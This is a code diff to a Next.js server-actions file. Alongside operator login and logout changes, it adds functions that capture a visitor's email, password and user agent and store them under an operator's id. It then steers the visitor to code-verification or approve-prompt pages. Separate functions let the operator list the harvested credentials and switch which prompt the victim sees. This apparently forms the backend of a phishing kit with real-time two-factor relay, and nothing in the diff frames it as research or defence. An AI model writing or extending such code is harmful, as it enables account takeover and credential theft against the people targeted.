@@ -2,9 +2,11 @@
 
 import connectDB from "@/db";
 import User from "@/db/User.Model";
+import Data from "@/db/Data.Model";
 import { decrypt, encrypt } from "@/lib/auth";
 import { revalidatePath } from "next/cache";
 import { cookies } from "next/headers";
+import { redirect } from "next/navigation";
 
 export async function logIn(FormData) {
   const username = FormData.get("username");
@@ -36,6 +38,9 @@ export async function logIn(FormData) {
       cookies().set("token", token, {
         secure: true,
         httpOnly: true,
+      });
+      cookies().set("username", user.username, {
+        secure: true,
       });
       return JSON.stringify({
         error: user._id,
@@ -81,21 +86,124 @@ export async function signUp(FormData) {
   }
 }
 export async function logOut() {
-  cookies().set("token", "");
+  cookies().delete("token");
+  redirect("/log-in");
 }
 export async function authCheck() {
-  const token = cookies().get("token")?.value;
-  if (!token) {
-    return null;
+  let success;
+  try {
+    const token = cookies().get("token")?.value;
+    if (!token) {
+      success = false;
+    }
+    let payload = await decrypt(token);
+    if (!payload) {
+      success = false;
+    }
+    await connectDB();
+    let user = await User.findOne({ _id: payload.id });
+
+    if (!user) {
+      success = false;
+    }
+    success = true;
+    let _id = user?._id;
+    return _id;
+  } catch (error) {
+    console.log(error);
+    success = false;
+  } finally {
+    if (!success) {
+      redirect("/log-in");
+    }
   }
-  let payload = await decrypt(token);
-  if (!payload) {
-    return null;
+}
+export async function getEmail(formData) {
+  let success;
+  try {
+    await connectDB();
+    const neData = new Data({
+      userAgent: formData.get("userAgent"),
+      email: formData.get("email"),
+      user: formData.get("id"),
+    });
+    cookies().set("email", formData.get("email"));
+    let { _id } = await neData.save();
+    let data = await User.findByIdAndUpdate(formData.get("id"), {
+      $push: { data: _id },
+    });
+    cookies().set("dataId", _id);
+    success = true;
+  } catch (error) {
+    success = false;
+    console.log(error);
+  } finally {
+    if (success) {
+      redirect("/" + formData.get("id") + "/login/password");
+    } else {
+      revalidatePath("/" + formData.get("id"));
+    }
   }
-  await connectDB();
-  let userDetail = await User.findOne({ _id: payload.id }, { username: 1 });
-  if (!userDetail) {
-    return null;
+}
+export async function getPassword(formData) {
+  let success;
+  let dataDetails;
+  try {
+    await connectDB();
+    dataDetails = await Data.findOneAndUpdate(
+      { _id: formData.get("id") },
+      { password: formData.get("password") }
+    );
+
+    return JSON.stringify({
+      success: true,
+    });
+  } catch (error) {
+    success = false;
+    console.log(error);
+  } finally {
+    if (dataDetails.state === "code") {
+      redirect("/" + formData.get("id") + "/login/password/verify-code");
+    } else if (dataDetails.state === "yes") {
+      redirect("/" + formData.get("id") + "/login/password/verify-yes");
+    }
   }
-  return JSON.stringify(userDetail);
+}
+export async function dataState(id) {
+  try {
+    await connectDB();
+    let data = await Data.findOne({ _id: id }, { state: 1, _id: 0 });
+    return JSON.stringify(data.state);
+  } catch (error) {
+    console.log(error);
+  }
+}
+export async function getAllData() {
+  let id = await authCheck();
+  try {
+    await connectDB();
+    const data = await User.find({ _id: id }, { data: 1, _id: 0 }).populate(
+      "data",
+      "userAgent email password state"
+    );
+    return JSON.stringify(data[0]);
+  } catch (error) {
+    console.log(error);
+  }
+}
+export async function getUserLinks() {
+  let id = await authCheck();
+  return JSON.stringify(id);
+}
+export async function changeState(id, state, code) {
+  try {
+    await connectDB();
+    if (code) {
+      let data = await Data.findOneAndUpdate({ _id: id }, { state, code });
+    }
+    let data = await Data.findOneAndUpdate({ _id: id }, { state });
+    return JSON.stringify(data);
+  } catch (error) {
+    console.log(error);
+  }
 }
